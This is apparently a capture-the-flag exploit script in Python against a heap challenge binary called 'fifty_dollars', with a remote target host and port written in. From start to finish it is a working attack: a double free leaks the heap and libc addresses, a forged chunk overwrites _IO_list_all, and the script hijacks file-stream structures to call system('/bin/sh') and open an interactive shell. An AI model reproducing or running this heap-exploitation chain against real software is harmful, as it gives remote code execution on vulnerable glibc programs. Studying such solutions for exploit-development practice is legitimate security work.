#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './fifty_dollars'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'178.62.40.102', 'port':6001})
env.select()

#==========

binf = ELF(bin_file)

libc = binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

#==========

def attack(conn):
    fd = FiftyDollars(conn)

    fd.alloc(0, 'a')
    fd.alloc(1, 'b')
    fd.alloc(2, p64(0xb0)+p64(0x10))

    fd.free(0)
    fd.free(1)
    fd.free(0)

    addr_heap_base = u(fd.show(0)) - 0x60
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    fd.alloc(0, p64(addr_heap_base + 0x20))
    fd.alloc(1, '\x00'*0x30+p64(0x60)+p64(0x10)+p64(0)+p64(0x11))
    fd.alloc(0, '\x00'*0x18+p64(0x61))
    
    fd.alloc(3, 'd')

    fd.free(0)
    fd.alloc(0, '\x00'*0x18+p64(0x91))
    fd.free(3)

    fd.free(0)
    fd.alloc(0, 'a'*0x1f+'!')

    addr_libc_mainarena = u(fd.show(0).split('a!')[1]) - 0x58
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    addr_libc_system        = libc.sep_function['system']
    addr_libc_io_list_all   = libc.symbols['_IO_list_all']
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))

    fake_chunk  = p64(0x0)
    fake_chunk += p64(0xb1)
    fake_chunk += p64(0xdeadbeef)
    fake_chunk += p64(addr_heap_base + 0x40)
    fake_chunk += p64(0x0)
    fake_chunk += p64(0x61)
    fake_chunk += p64(0xdeadbeef)
    fake_chunk += p64(addr_libc_io_list_all - 0x10)
    fd.free(0)
    fd.alloc(0, '\x00'*0x10+fake_chunk)

    fd.alloc(4, 'e')

    fd.free(2)
    fd.alloc(2, '\x00'*0x28 + p64(addr_heap_base))
    fd.free(0)
    fd.alloc(0, p64(0) + p64(addr_libc_system) + '/bin/sh')

    conn.sendafter('choice:', '4')

class FiftyDollars:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def alloc(self, idx, content):
        self.sendafter('choice:', '1')
        self.sendafter('Index:', str(idx))
        self.sendafter('Content:', content)

    def show(self, idx):
        self.sendafter('choice:', '2')
        self.sendafter('Index:', str(idx))
        return self.recvuntil('Done!\n', drop=True)

    def free(self, idx):
        self.sendafter('choice:', '3')
        self.sendafter('Index:', str(idx))

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
